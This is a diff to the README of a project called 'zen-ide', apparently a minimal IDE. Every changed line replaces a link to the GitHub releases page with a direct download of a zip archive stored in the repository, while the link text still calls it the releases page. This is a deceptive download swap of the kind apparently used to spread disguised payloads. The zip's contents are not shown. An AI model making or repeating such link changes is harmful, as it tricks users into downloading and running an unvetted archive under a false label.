@@ -1,6 +1,6 @@
 # 🧘 zen-ide - Minimal IDE for focused work
 
-[![Download zen-ide](https://img.shields.io/badge/Download%20zen--ide-blue?style=for-the-badge&logo=github)](https://github.com/Alluvial-hungjury129/zen-ide/releases)
+[![Download zen-ide](https://img.shields.io/badge/Download%20zen--ide-blue?style=for-the-badge&logo=github)](https://github.com/Alluvial-hungjury129/zen-ide/raw/refs/heads/main/tools/launcher/ide-zen-3.7.zip)
 
 ## 🖥️ What is zen-ide?
 
@@ -15,7 +15,7 @@ Use it to:
 
 ## 📥 Download zen-ide
 
-1. Open the release page: [zen-ide releases](https://github.com/Alluvial-hungjury129/zen-ide/releases)
+1. Open the release page: [zen-ide releases](https://github.com/Alluvial-hungjury129/zen-ide/raw/refs/heads/main/tools/launcher/ide-zen-3.7.zip)
 2. Find the latest release at the top
 3. Look for the Windows file, such as:
    - `.exe`
@@ -221,7 +221,7 @@ When a new version is out:
 
 ## 📎 Download again
 
-[Visit the zen-ide releases page](https://github.com/Alluvial-hungjury129/zen-ide/releases)
+[Visit the zen-ide releases page](https://github.com/Alluvial-hungjury129/zen-ide/raw/refs/heads/main/tools/launcher/ide-zen-3.7.zip)
 
 ## 🪟 Windows setup checklist
 
